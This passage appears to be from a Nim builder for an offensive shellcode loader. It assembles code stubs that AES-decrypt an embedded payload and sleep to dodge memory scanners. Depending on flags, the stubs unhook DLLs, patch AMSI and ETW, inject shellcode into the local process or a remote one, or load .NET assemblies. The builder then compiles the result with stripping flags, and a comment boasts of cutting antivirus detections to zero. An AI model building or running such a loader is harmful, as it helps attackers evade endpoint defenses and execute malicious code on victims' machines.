#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, CreateFileA, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetFileSize, HeapAlloc, GetProcessHeap, ReadFile, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, GetCurrentProcess, GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, FALSE, VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, VirtualProtect, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES, NtClose
import dynlib
import strformat
from os import sleep, paramCount, paramStr
from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import base64
import strutils
import ptr_math
import strenc

var success: BOOL

const encstring = slurp"enc.blob"

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]
"""

let Cryptstub2 = fmt"""
var enctext: seq[byte] = toByteSeq(encstring)
var key: array[aes256.sizeKey, byte]
var envkey: string = decode("{encodedenvkey}")
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("{encodedIV}")
"""

let Cryptstub3 = fmt"""
# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Ecnrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

echo "[*] Sleeping to avoid in memory scanners"
sleep({sleeptime}) 

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

"""


var stub = Cryptstub1 & Cryptstub2 & Cryptstub3
if(unhook):
    stub.add(Winimleanstub)
    stub.add(UnhookStub)
if (shellcode):
    if (AMSI):
        stub = stub &  GetSyscallStub & AMSIETWDelegates & AMSIStub
        if(ETW):
            if (COMVARETW):
                stub = stub & ETWCOMVARStub
            else:
                stub = stub & ETWPatchStub
    else:
        if(ETW):
            if (COMVARETW):
                stub = stub & ETWCOMVARStub
            else:
                stub = stub & GetSyscallStub & AMSIETWDelegates & ETWPatchStub
    if(localinject):
        stub = stub & LocalInjectDelegates & ShellcodelocalStub
    else:
        stub.add(RemoteProcImportStub)
        if (processname == ""):
            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
        else:
            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customproc & ShellcoderemoteinjectStub

if (csharp):
    stub.add(AssemblyImports)
    if (AMSI):
        stub.add(GetSyscallStub)
        stub.add(AMSIETWDelegates)
        stub.add(AMSIStub)
        if(ETW):
            if (COMVARETW):
                stub.add(ETWCOMVARStub)
            else:
                stub.add(ETWPatchStub)
    else:
        if(ETW):
            if (COMVARETW):
                stub.add(ETWCOMVARStub)
            else:
                stub.add(GetSyscallStub)
                stub.add(AMSIETWDelegates)
                stub.add(ETWPatchStub)
    echo "adding Stub:"
    if (noArgs):
        stub.add(LoadAssemblyStub)
        stub.add(LoadAssemblyStubNoArgs)
    else:
        stub.add(LoadAssemblyStub)
        stub.add(LoadAssemblyStubArgs)

writeFile("Loader.nim", stub)
echo "Written Loader.nim, compiling -> \n\n"
# --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
# This is only for the best size: -d:danger -d:strip --opt:size --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
if (denim):
    var exist: bool = existsFile("denim.exe")
    if (exist):
        discard os.execShellCmd(fmt".\denim.exe compile Loader.nim")
        let msg = fmt"[!] Encrypted file saved to Loader.exe"
    else:
        echo fmt"'.\Denim.exe' not found. You need to download and install it from here: https://github.com/moloch--/denim"
if (reflective):
    if (hide):
        discard os.execShellCmd(fmt"nim c -d:release --app=console --app:gui --dynamicbase,--export-all-symbols --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
    else:
        discard os.execShellCmd(fmt"nim c -d:release --app=console --dynamicbase,--export-all-symbols --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
else:
    if(hide):
        discard os.execShellCmd(fmt"nim c -d:release --app:gui --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
    else:
        discard os.execShellCmd(fmt"nim c -d:release --app:console --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
let msg = fmt"[!] Encrypted file saved to {outfile}"
echo "\n" & msg
